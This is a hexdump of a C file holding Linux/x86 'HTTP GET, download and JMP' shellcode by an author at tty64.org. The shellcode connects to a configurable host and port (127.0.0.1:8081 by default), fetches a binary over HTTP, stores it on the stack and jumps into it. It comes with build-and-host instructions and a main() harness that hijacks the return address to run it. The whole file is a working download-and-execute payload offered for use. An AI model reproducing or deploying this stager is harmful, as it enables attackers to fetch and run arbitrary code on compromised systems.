00000000  2f 2a 20 28 6c 69 6e 75  78 2f 78 38 36 29 20 48  |/* (linux/x86) H|
00000010  54 54 50 2f 31 2e 78 20  47 45 54 2c 20 44 6f 77  |TTP/1.x GET, Dow|
00000020  6e 6c 6f 61 64 73 20 61  6e 64 20 4a 4d 50 20 2d  |nloads and JMP -|
00000030  20 36 38 20 62 79 74 65  73 2b 0d 0a 20 2a 0d 0a  | 68 bytes+.. *..|
00000040  20 2a 20 54 68 69 73 20  73 68 65 6c 6c 63 6f 64  | * This shellcod|
00000050  65 20 61 6c 6c 6f 77 73  20 79 6f 75 20 74 6f 20  |e allows you to |
00000060  64 6f 77 6e 6c 6f 61 64  20 61 20 62 69 6e 61 72  |download a binar|
00000070  79 20 63 6f 64 65 20 73  74 72 61 69 67 68 74 20  |y code straight |
00000080  6f 66 66 20 61 20 73 74  61 6e 64 61 72 64 20 48  |off a standard H|
00000090  54 54 50 20 73 65 72 76  65 72 0d 0a 20 2a 20 61  |TTP server.. * a|
000000a0  6e 64 20 65 78 65 63 75  74 65 20 69 74 2e 20 54  |nd execute it. T|
000000b0  68 65 20 64 6f 77 6e 6c  6f 61 64 65 64 20 73 68  |he downloaded sh|
000000c0  65 6c 6c 63 6f 64 65 20  28 65 2e 67 2e 20 62 69  |ellcode (e.g. bi|
000000d0  6e 61 72 79 20 63 6f 64  65 29 20 77 69 6c 6c 20  |nary code) will |
000000e0  62 65 20 65 78 65 63 75  74 65 64 20 6f 6e 20 74  |be executed on t|
000000f0  68 65 20 73 74 61 63 6b  2e 0d 0a 20 2a 0d 0a 20  |he stack... *.. |
00000100  2a 20 3c 44 45 4d 4f 4e  53 54 52 41 54 49 4f 4e  |* <DEMONSTRATION|
00000110  3e 3a 0d 0a 20 2a 0d 0a  20 2a 20 3e 20 53 74 61  |>:.. *.. * > Sta|
00000120  72 74 69 6e 67 20 62 79  20 63 72 65 61 74 69 6e  |rting by creatin|
00000130  67 20 61 20 76 65 72 79  20 73 69 6d 70 6c 65 20  |g a very simple |
00000140  73 68 65 6c 6c 63 6f 64  65 2c 20 74 68 61 74 20  |shellcode, that |
00000150  77 69 6c 6c 20 62 65 20  64 6f 77 6e 6c 6f 61 64  |will be download|
00000160  65 64 20 61 6e 64 20 65  78 65 63 75 74 65 2e 0d  |ed and execute..|
00000170  0a 20 2a 20 0d 0a 20 2a  20 72 6f 6f 74 40 6d 61  |. * .. * root@ma|
00000180  67 69 63 62 6f 78 3a 2f  74 6d 70 23 20 63 61 74  |gicbox:/tmp# cat|
00000190  20 66 6f 6f 62 61 72 2e  73 0d 0a 20 2a 09 2e 73  | foobar.s.. *..s|
000001a0  65 63 74 69 6f 6e 20 2e  74 65 78 74 0d 0a 20 2a  |ection .text.. *|
000001b0  20 20 20 20 20 20 2e 67  6c 6f 62 61 6c 20 5f 73  |      .global _s|
000001c0  74 61 72 74 0d 0a 20 2a  20 20 20 20 20 20 5f 73  |tart.. *      _s|
000001d0  74 61 72 74 3a 0d 0a 20  2a 0d 0a 20 2a 09 09 6d  |tart:.. *.. *..m|
000001e0  6f 76 6c 20 24 30 78 34  2c 20 25 65 61 78 0d 0a  |ovl $0x4, %eax..|
000001f0  20 2a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  | *              |
00000200  6d 6f 76 6c 20 24 30 78  31 2c 20 25 65 62 78 0d  |movl $0x1, %ebx.|
00000210  0a 20 2a 0d 0a 20 2a 20  20 20 20 20 20 20 20 20  |. *.. *         |
00000220  20 20 20 20 20 63 61 6c  6c 20 5f 64 6f 69 6e 74  |     call _doint|
00000230  0d 0a 20 2a 20 20 20 20  20 20 20 20 20 20 20 20  |.. *            |
00000240  20 20 20 20 20 20 20 20  20 20 2e 61 73 63 69 69  |          .ascii|
00000250  20 22 48 65 6c 6c 6f 20  57 6f 72 6c 64 21 22 0d  | "Hello World!".|
00000260  0a 20 2a 09 09 09 2e 62  79 74 65 20 30 78 61 0d  |. *....byte 0xa.|
00000270  0a 20 2a 20 20 20 20 20  20 20 20 20 20 20 20 20  |. *             |
00000280  20 5f 64 6f 69 6e 74 3a  0d 0a 20 2a 20 20 20 20  | _doint:.. *    |
00000290  20 20 20 20 20 20 20 20  20 20 70 6f 70 6c 20 25  |          popl %|
000002a0  65 63 78 0d 0a 20 2a 20  20 20 20 20 20 20 20 20  |ecx.. *         |
000002b0  20 20 20 20 20 6d 6f 76  6c 20 24 30 78 64 2c 20  |     movl $0xd, |
000002c0  25 65 64 78 0d 0a 20 2a  20 20 20 20 20 20 20 20  |%edx.. *        |
000002d0  20 20 20 20 20 20 69 6e  74 20 24 30 78 38 30 0d  |      int $0x80.|
000002e0  0a 20 2a 0d 0a 20 2a 20  20 20 20 20 20 20 20 20  |. *.. *         |
000002f0  20 20 20 20 20 6d 6f 76  6c 20 24 30 78 31 2c 20  |     movl $0x1, |
00000300  25 65 61 78 0d 0a 20 2a  20 20 20 20 20 20 20 20  |%eax.. *        |
00000310  20 20 20 20 20 20 69 6e  74 20 24 30 78 38 30 0d  |      int $0x80.|
00000320  0a 20 2a 0d 0a 20 2a 09  09 23 20 52 65 76 65 72  |. *.. *..# Rever|
00000330  73 65 20 43 41 4c 4c 0d  0a 20 2a 20 20 20 20 20  |se CALL.. *     |
00000340  20 20 20 20 20 20 20 20  20 63 61 6c 6c 20 5f 73  |         call _s|
00000350  74 61 72 74 0d 0a 20 2a  0d 0a 20 2a 20 3e 20 54  |tart.. *.. * > T|
00000360  68 65 20 6f 6e 6c 79 20  72 65 71 75 69 72 65 6d  |he only requirem|
00000370  65 6e 74 20 66 72 6f 6d  20 74 68 65 20 64 6f 77  |ent from the dow|
00000380  6e 6c 6f 61 64 65 64 20  73 68 65 6c 6c 63 6f 64  |nloaded shellcod|
00000390  65 2c 20 69 73 20 74 68  61 74 20 69 74 20 77 69  |e, is that it wi|
000003a0  6c 6c 20 69 6e 63 6c 75  64 65 20 61 20 72 65 76  |ll include a rev|
000003b0  65 72 73 65 20 0d 0a 20  2a 20 20 20 43 41 4c 4c  |erse .. *   CALL|
000003c0  20 74 6f 20 69 74 73 65  6c 66 2e 20 41 73 20 74  | to itself. As t|
000003d0  68 69 73 20 73 68 65 6c  6c 63 6f 64 65 20 64 6f  |his shellcode do|
000003e0  65 73 20 6e 6f 74 20 70  61 72 73 65 20 74 68 65  |es not parse the|
000003f0  20 48 54 54 50 20 68 65  61 64 65 72 2c 20 69 74  | HTTP header, it|
00000400  20 68 61 73 20 6e 6f 20  77 61 79 20 74 6f 20 6b  | has no way to k|
00000410  6e 6f 77 20 0d 0a 20 2a  20 20 20 77 68 65 72 65  |now .. *   where|
00000420  20 74 68 65 20 64 6f 77  6e 6c 6f 61 64 65 64 20  | the downloaded |
00000430  73 68 65 6c 6c 63 6f 64  65 20 62 65 67 69 6e 73  |shellcode begins|
00000440  20 6f 72 20 65 6e 64 73  2e 20 54 68 65 72 65 66  | or ends. Theref|
00000450  6f 72 20 69 74 20 72 65  61 6c 79 73 20 6f 6e 20  |or it realys on |
00000460  74 68 65 20 64 6f 77 6e  6c 6f 61 64 65 64 20 0d  |the downloaded .|
00000470  0a 20 2a 20 20 20 73 68  65 6c 6c 63 6f 64 65 20  |. *   shellcode |
00000480  74 6f 20 73 75 70 70 6c  79 20 74 68 61 74 2c 20  |to supply that, |
00000490  62 79 20 69 6e 63 6c 75  64 69 6e 67 20 61 20 43  |by including a C|
000004a0  41 4c 4c 20 69 6e 20 74  68 65 20 62 6f 74 74 6f  |ALL in the botto|
000004b0  6d 2c 20 77 68 69 63 68  20 77 69 6c 6c 20 62 65  |m, which will be|
000004c0  20 4a 4d 50 20 69 6e 74  6f 2e 0d 0a 20 2a 0d 0a  | JMP into... *..|
000004d0  20 2a 20 3e 20 43 6f 6d  70 69 6c 65 20 74 68 65  | * > Compile the|
000004e0  20 67 69 76 65 6e 20 73  68 65 6c 6c 63 6f 64 65  | given shellcode|
000004f0  20 0d 0a 20 2a 0d 0a 20  2a 20 72 6f 6f 74 40 6d  | .. *.. * root@m|
00000500  61 67 69 63 62 6f 78 3a  2f 74 6d 70 23 20 61 73  |agicbox:/tmp# as|
00000510  20 2d 6f 20 66 6f 6f 62  61 72 2e 6f 20 66 6f 6f  | -o foobar.o foo|
00000520  62 61 72 2e 73 0d 0a 20  2a 20 72 6f 6f 74 40 6d  |bar.s.. * root@m|
00000530  61 67 69 63 62 6f 78 3a  2f 74 6d 70 23 20 6c 64  |agicbox:/tmp# ld|
00000540  20 2d 6f 20 66 6f 6f 62  61 72 20 66 6f 6f 62 61  | -o foobar fooba|
00000550  72 2e 6f 0d 0a 20 2a 0d  0a 20 2a 20 3e 20 43 6f  |r.o.. *.. * > Co|
00000560  6e 76 65 72 74 20 74 68  69 73 20 66 69 6c 65 20  |nvert this file |
00000570  69 6e 74 6f 20 61 20 72  61 77 20 62 69 6e 61 72  |into a raw binar|
00000580  79 20 28 68 65 61 64 65  72 6c 65 73 73 2c 20 66  |y (headerless, f|
00000590  6f 72 6d 61 74 6c 65 73  73 29 0d 0a 20 2a 0d 0a  |ormatless).. *..|
000005a0  20 2a 20 72 6f 6f 74 40  6d 61 67 69 63 62 6f 78  | * root@magicbox|
000005b0  3a 2f 74 6d 70 23 20 6f  62 6a 63 6f 70 79 20 2d  |:/tmp# objcopy -|
000005c0  4f 20 62 69 6e 61 72 79  20 66 6f 6f 62 61 72 20  |O binary foobar |
000005d0  66 6f 6f 62 61 72 2e 62  69 6e 0d 0a 20 2a 0d 0a  |foobar.bin.. *..|
000005e0  20 2a 20 3e 20 48 6f 73  74 20 74 68 69 73 20 66  | * > Host this f|
000005f0  69 6c 65 2c 20 6f 6e 20  73 6f 6d 65 20 48 54 54  |ile, on some HTT|
00000600  50 20 73 65 72 76 65 72  20 28 49 20 68 61 76 65  |P server (I have|
00000610  64 20 75 73 65 64 20 41  70 61 63 68 65 2f 31 2e  |d used Apache/1.|
00000620  33 2e 33 34 29 0d 0a 20  2a 0d 0a 20 2a 20 3e 20  |3.34).. *.. * > |
00000630  55 73 65 20 67 65 6e 5f  68 74 74 70 72 65 71 2e  |Use gen_httpreq.|
00000640  63 20 74 6f 20 67 65 6e  65 72 61 74 65 20 61 20  |c to generate a |
00000650  55 52 4c 20 72 65 71 75  65 73 74 20 28 65 2e 67  |URL request (e.g|
00000660  2e 20 2f 66 6f 6f 62 61  72 2e 62 69 6e 29 0d 0a  |. /foobar.bin)..|
00000670  20 2a 0d 0a 20 2a 20 3e  20 50 61 73 74 65 20 74  | *.. * > Paste t|
00000680  68 65 20 67 65 6e 5f 68  74 74 70 72 65 71 2e 63  |he gen_httpreq.c|
00000690  20 6f 75 74 70 75 74 2c  20 69 6e 74 6f 20 74 68  | output, into th|
000006a0  69 73 20 73 68 65 6c 6c  63 6f 64 65 20 61 74 20  |is shellcode at |
000006b0  74 68 65 20 6d 61 72 6b  65 64 20 70 6c 61 63 65  |the marked place|
000006c0  2e 0d 0a 20 2a 0d 0a 20  2a 20 3e 20 43 6f 6d 70  |... *.. * > Comp|
000006d0  69 6c 65 20 74 68 69 73  20 73 68 65 6c 6c 63 6f  |ile this shellco|
000006e0  64 65 20 77 2f 20 74 68  65 20 67 65 6e 5f 68 74  |de w/ the gen_ht|
000006f0  74 70 72 65 71 20 6f 75  74 70 75 74 20 69 6e 20  |tpreq output in |
00000700  69 74 2e 0d 0a 20 2a 0d  0a 20 2a 20 3e 20 45 78  |it... *.. * > Ex|
00000710  65 63 75 74 65 20 74 68  69 73 20 73 68 65 6c 6c  |ecute this shell|
00000720  63 6f 64 65 0d 0a 20 2a  20 0d 0a 20 2a 20 72 6f  |code.. * .. * ro|
00000730  6f 74 40 6d 61 67 69 63  62 6f 78 3a 2f 74 6d 70  |ot@magicbox:/tmp|
00000740  23 20 67 63 63 20 2d 6f  20 68 74 74 70 2d 64 6f  |# gcc -o http-do|
00000750  77 6e 6c 6f 61 64 2d 6a  6d 70 20 68 74 74 70 2d  |wnload-jmp http-|
00000760  64 6f 77 6e 6c 6f 61 64  2d 6a 6d 70 2e 63 0d 0a  |download-jmp.c..|
00000770  20 2a 20 72 6f 6f 74 40  6d 61 67 69 63 62 6f 78  | * root@magicbox|
00000780  3a 2f 74 6d 70 23 20 2e  2f 68 74 74 70 2d 64 6f  |:/tmp# ./http-do|
00000790  77 6e 6c 6f 61 64 2d 6a  6d 70 0d 0a 20 2a 20 48  |wnload-jmp.. * H|
000007a0  65 6c 6c 6f 20 57 6f 72  6c 64 21 0d 0a 20 2a 20  |ello World!.. * |
000007b0  72 6f 6f 74 40 6d 61 67  69 63 62 6f 78 3a 2f 74  |root@magicbox:/t|
000007c0  6d 70 23 0d 0a 20 2a 0d  0a 20 2a 20 3c 4c 49 4e  |mp#.. *.. * <LIN|
000007d0  4b 53 2f 55 54 49 4c 49  54 49 45 53 3e 3a 0d 0a  |KS/UTILITIES>:..|
000007e0  20 2a 0d 0a 20 2a 20 20  20 20 20 20 67 65 6e 5f  | *.. *      gen_|
000007f0  68 74 74 70 72 65 71 2e  63 2c 20 67 65 6e 65 72  |httpreq.c, gener|
00000800  61 74 65 73 20 61 20 48  54 54 50 20 47 45 54 20  |ates a HTTP GET |
00000810  72 65 71 75 65 73 74 20  66 6f 72 20 74 68 69 73  |request for this|
00000820  20 73 68 65 6c 6c 63 6f  64 65 0d 0a 20 2a 20 20  | shellcode.. *  |
00000830  20 20 20 20 3e 20 68 74  74 70 3a 2f 2f 77 77 77  |    > http://www|
00000840  2e 74 74 79 36 34 2e 6f  72 67 2f 73 68 65 6c 6c  |.tty64.org/shell|
00000850  63 6f 64 65 2f 75 74 69  6c 69 74 69 65 73 2f 67  |code/utilities/g|
00000860  65 6e 5f 68 74 74 70 72  65 71 2e 63 0d 0a 20 2a  |en_httpreq.c.. *|
00000870  0d 0a 20 2a 20 2d 20 69  7a 69 6b 20 3c 69 7a 69  |.. * - izik <izi|
00000880  6b 40 74 74 79 36 34 2e  6f 72 67 3e 0d 0a 20 2a  |k@tty64.org>.. *|
00000890  2f 0d 0a 0d 0a 63 68 61  72 20 73 68 65 6c 6c 63  |/....char shellc|
000008a0  6f 64 65 5b 5d 20 3d 20  0d 0a 0d 0a 09 22 5c 78  |ode[] = ....."\x|
000008b0  36 61 5c 78 36 36 22 20  20 20 20 20 20 20 20 20  |6a\x66"         |
000008c0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |     // push $0x|
000008d0  36 36 20 0d 0a 09 22 5c  78 35 38 22 20 20 20 20  |66 ..."\x58"    |
000008e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000008f0  20 70 6f 70 20 25 65 61  78 20 0d 0a 09 22 5c 78  | pop %eax ..."\x|
00000900  39 39 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |99"             |
00000910  20 20 20 20 20 2f 2f 20  63 6c 74 64 20 0d 0a 09  |     // cltd ...|
00000920  22 5c 78 36 61 5c 78 30  31 22 20 20 20 20 20 20  |"\x6a\x01"      |
00000930  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000940  24 30 78 31 20 0d 0a 09  22 5c 78 35 62 22 20 20  |$0x1 ..."\x5b"  |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000960  2f 2f 20 70 6f 70 20 25  65 62 78 20 0d 0a 09 22  |// pop %ebx ..."|
00000970  5c 78 35 32 22 20 20 20  20 20 20 20 20 20 20 20  |\x52"           |
00000980  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
00000990  65 64 78 20 0d 0a 09 22  5c 78 35 33 22 20 20 20  |edx ..."\x53"   |
000009a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000009b0  2f 20 70 75 73 68 20 25  65 62 78 20 0d 0a 09 22  |/ push %ebx ..."|
000009c0  5c 78 36 61 5c 78 30 32  22 20 20 20 20 20 20 20  |\x6a\x02"       |
000009d0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 24  |       // push $|
000009e0  30 78 32 20 0d 0a 09 22  5c 78 38 39 5c 78 65 31  |0x2 ..."\x89\xe1|
000009f0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000a00  2f 20 6d 6f 76 20 25 65  73 70 2c 25 65 63 78 20  |/ mov %esp,%ecx |
00000a10  0d 0a 09 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |..."\xcd\x80"   |
00000a20  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
00000a30  74 20 24 30 78 38 30 20  0d 0a 09 22 5c 78 35 62  |t $0x80 ..."\x5b|
00000a40  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000a50  20 20 20 2f 2f 20 70 6f  70 20 25 65 62 78 20 0d  |   // pop %ebx .|
00000a60  0a 09 22 5c 78 35 64 22  20 20 20 20 20 20 20 20  |.."\x5d"        |
00000a70  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 6f 70  |          // pop|
00000a80  20 25 65 62 70 20 0d 0a  0d 0a 09 09 09 09 2f 2f  | %ebp ........//|
00000a90  0d 0a 09 22 5c 78 62 65  5c 78 38 30 5c 78 66 66  |..."\xbe\x80\xff|
00000aa0  5c 78 66 66 5c 78 66 65  22 20 20 2f 2f 20 6d 6f  |\xff\xfe"  // mo|
00000ab0  76 20 24 30 78 66 65 66  66 66 66 38 30 2c 25 65  |v $0xfeffff80,%e|
00000ac0  73 69 20 0d 0a 09 09 09  09 2f 2f 20 28 30 78 30  |si ......// (0x0|
00000ad0  78 66 65 66 66 66 66 38  30 20 3d 20 7e 31 32 37  |xfeffff80 = ~127|
00000ae0  2e 30 2e 30 2e 31 29 0d  0a 09 09 09 09 2f 2f 0d  |.0.0.1)......//.|
00000af0  0a 0d 0a 09 09 09 09 2f  2f 0d 0a 09 22 5c 78 36  |.......//..."\x6|
00000b00  36 5c 78 62 64 5c 78 39  31 5c 78 31 66 22 20 20  |6\xbd\x91\x1f"  |
00000b10  20 20 20 20 2f 2f 20 6d  6f 76 20 24 30 78 31 66  |    // mov $0x1f|
00000b20  39 31 2c 25 62 70 20 0d  0a 09 09 09 09 2f 2f 20  |91,%bp ......// |
00000b30  28 30 78 31 66 39 31 20  3d 20 38 30 38 31 2f 74  |(0x1f91 = 8081/t|
00000b40  63 70 29 0d 0a 09 09 09  09 2f 2f 0d 0a 0d 0a 09  |cp)......//.....|
00000b50  2f 2f 0d 0a 09 2f 2f 20  22 5c 78 36 36 5c 78 62  |//...// "\x66\xb|
00000b60  64 5c 78 61 66 5c 78 66  66 22 09 2f 2f 20 6d 6f  |d\xaf\xff".// mo|
00000b70  76 20 24 30 78 66 66 61  66 2c 20 25 62 70 0d 0a  |v $0xffaf, %bp..|
00000b80  09 2f 2f 09 09 09 2f 2f  20 28 30 78 61 66 66 66  |.//...// (0xafff|
00000b90  20 3d 20 7e 30 30 38 30  2f 74 63 70 29 0d 0a 09  | = ~0080/tcp)...|
00000ba0  2f 2f 20 22 5c 78 36 36  5c 78 66 37 5c 78 64 35  |// "\x66\xf7\xd5|
00000bb0  22 20 20 20 20 20 20 20  2f 2f 20 6e 6f 74 20 25  |"       // not %|
00000bc0  62 70 0d 0a 09 2f 2f 0d  0a 0d 0a 09 22 5c 78 66  |bp...//....."\xf|
00000bd0  37 5c 78 64 36 22 20 20  20 20 20 20 20 20 20 20  |7\xd6"          |
00000be0  20 20 20 20 2f 2f 20 6e  6f 74 20 25 65 73 69 20  |    // not %esi |
00000bf0  0d 0a 09 22 5c 78 35 36  22 20 20 20 20 20 20 20  |..."\x56"       |
00000c00  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
00000c10  73 68 20 25 65 73 69 20  0d 0a 09 22 5c 78 30 66  |sh %esi ..."\x0f|
00000c20  5c 78 63 64 22 20 20 20  20 20 20 20 20 20 20 20  |\xcd"           |
00000c30  20 20 20 2f 2f 20 62 73  77 61 70 20 25 65 62 70  |   // bswap %ebp|
00000c40  20 0d 0a 09 22 5c 78 30  39 5c 78 64 64 22 20 20  | ..."\x09\xdd"  |
00000c50  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6f  |            // o|
00000c60  72 20 25 65 62 78 2c 25  65 62 70 20 0d 0a 09 22  |r %ebx,%ebp ..."|
00000c70  5c 78 35 35 22 20 20 20  20 20 20 20 20 20 20 20  |\x55"           |
00000c80  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
00000c90  65 62 70 20 0d 0a 09 22  5c 78 34 33 22 20 20 20  |ebp ..."\x43"   |
00000ca0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000cb0  2f 20 69 6e 63 20 25 65  62 78 20 0d 0a 09 22 5c  |/ inc %ebx ..."\|
00000cc0  78 36 61 5c 78 31 30 22  20 20 20 20 20 20 20 20  |x6a\x10"        |
00000cd0  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 24 30  |      // push $0|
00000ce0  78 31 30 20 0d 0a 09 22  5c 78 35 31 22 20 20 20  |x10 ..."\x51"   |
00000cf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000d00  2f 20 70 75 73 68 20 25  65 63 78 20 0d 0a 09 22  |/ push %ecx ..."|
00000d10  5c 78 35 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x50"           |
00000d20  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
00000d30  65 61 78 20 0d 0a 09 22  5c 78 62 30 5c 78 36 36  |eax ..."\xb0\x66|
00000d40  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000d50  2f 20 6d 6f 76 20 24 30  78 36 36 2c 25 61 6c 20  |/ mov $0x66,%al |
00000d60  0d 0a 09 22 5c 78 38 39  5c 78 65 31 22 20 20 20  |..."\x89\xe1"   |
00000d70  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
00000d80  76 20 25 65 73 70 2c 25  65 63 78 20 0d 0a 09 22  |v %esp,%ecx ..."|
00000d90  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000da0  20 20 20 20 20 20 20 2f  2f 20 69 6e 74 20 24 30  |       // int $0|
00000db0  78 38 30 20 0d 0a 0d 0a  09 2f 2f 0d 0a 09 2f 2f  |x80 .....//...//|
00000dc0  20 3c 70 61 73 74 65 20  68 65 72 65 20 74 68 65  | <paste here the|
00000dd0  20 63 6f 64 65 2c 20 74  68 61 74 20 67 65 6e 5f  | code, that gen_|
00000de0  68 74 74 70 72 65 71 2e  63 20 6f 75 74 70 75 74  |httpreq.c output|
00000df0  73 21 3e 0d 0a 09 2f 2f  0d 0a 0d 0a 09 22 5c 78  |s!>...//....."\x|
00000e00  38 39 5c 78 65 31 22 20  20 20 20 20 20 20 20 20  |89\xe1"         |
00000e10  20 20 20 20 20 2f 2f 20  6d 6f 76 20 25 65 73 70  |     // mov %esp|
00000e20  2c 25 65 63 78 20 0d 0a  09 22 5c 78 62 30 5c 78  |,%ecx ..."\xb0\x|
00000e30  30 34 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |04"             |
00000e40  20 2f 2f 20 6d 6f 76 20  24 30 78 34 2c 25 61 6c  | // mov $0x4,%al|
00000e50  20 0d 0a 09 22 5c 78 63  64 5c 78 38 30 22 20 20  | ..."\xcd\x80"  |
00000e60  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
00000e70  6e 74 20 24 30 78 38 30  20 0d 0a 0d 0a 09 2f 2f  |nt $0x80 .....//|
00000e80  0d 0a 09 2f 2f 20 3c 5f  72 65 63 76 5f 68 74 74  |...// <_recv_htt|
00000e90  70 5f 72 65 71 75 65 73  74 3e 3a 0d 0a 09 2f 2f  |p_request>:...//|
00000ea0  0d 0a 0d 0a 09 22 5c 78  62 30 5c 78 30 33 22 20  |....."\xb0\x03" |
00000eb0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000ec0  6d 6f 76 20 24 30 78 33  2c 25 61 6c 20 0d 0a 09  |mov $0x3,%al ...|
00000ed0  22 5c 78 36 61 5c 78 30  31 22 20 20 20 20 20 20  |"\x6a\x01"      |
00000ee0  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000ef0  24 30 78 31 20 0d 0a 09  22 5c 78 35 61 22 20 20  |$0x1 ..."\x5a"  |
00000f00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000f10  2f 2f 20 70 6f 70 20 25  65 64 78 20 0d 0a 09 22  |// pop %edx ..."|
00000f20  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000f30  20 20 20 20 20 20 20 2f  2f 20 69 6e 74 20 24 30  |       // int $0|
00000f40  78 38 30 20 0d 0a 09 22  5c 78 34 31 22 20 20 20  |x80 ..."\x41"   |
00000f50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000f60  2f 20 69 6e 63 20 25 65  63 78 20 0d 0a 09 22 5c  |/ inc %ecx ..."\|
00000f70  78 38 35 5c 78 63 30 22  20 20 20 20 20 20 20 20  |x85\xc0"        |
00000f80  20 20 20 20 20 20 2f 2f  20 74 65 73 74 20 25 65  |      // test %e|
00000f90  61 78 2c 25 65 61 78 20  0d 0a 09 22 5c 78 37 35  |ax,%eax ..."\x75|
00000fa0  5c 78 66 34 22 20 20 20  20 20 20 20 20 20 20 20  |\xf4"           |
00000fb0  20 20 20 2f 2f 20 6a 6e  65 20 3c 5f 72 65 63 76  |   // jne <_recv|
00000fc0  5f 68 74 74 70 5f 72 65  71 75 65 73 74 3e 20 0d  |_http_request> .|
00000fd0  0a 09 22 5c 78 38 33 5c  78 65 39 5c 78 30 36 22  |.."\x83\xe9\x06"|
00000fe0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 73 75 62  |          // sub|
00000ff0  20 24 30 78 36 2c 25 65  63 78 20 0d 0a 09 22 5c  | $0x6,%ecx ..."\|
00001000  78 66 66 5c 78 65 31 22  3b 20 20 20 20 20 20 20  |xff\xe1";       |
00001010  20 20 20 20 20 20 2f 2f  20 6a 6d 70 20 2a 25 65  |      // jmp *%e|
00001020  63 78 20 0d 0a 0d 0a 69  6e 74 20 6d 61 69 6e 28  |cx ....int main(|
00001030  69 6e 74 20 61 72 67 63  2c 20 63 68 61 72 20 2a  |int argc, char *|
00001040  2a 61 72 67 76 29 20 7b  0d 0a 09 69 6e 74 20 2a  |*argv) {...int *|
00001050  72 65 74 3b 0d 0a 09 72  65 74 20 3d 20 28 69 6e  |ret;...ret = (in|
00001060  74 20 2a 29 26 72 65 74  20 2b 20 32 3b 0d 0a 09  |t *)&ret + 2;...|
00001070  28 2a 72 65 74 29 20 3d  20 28 69 6e 74 29 20 73  |(*ret) = (int) s|
00001080  68 65 6c 6c 63 6f 64 65  3b 0d 0a 7d              |hellcode;..}|
0000108c
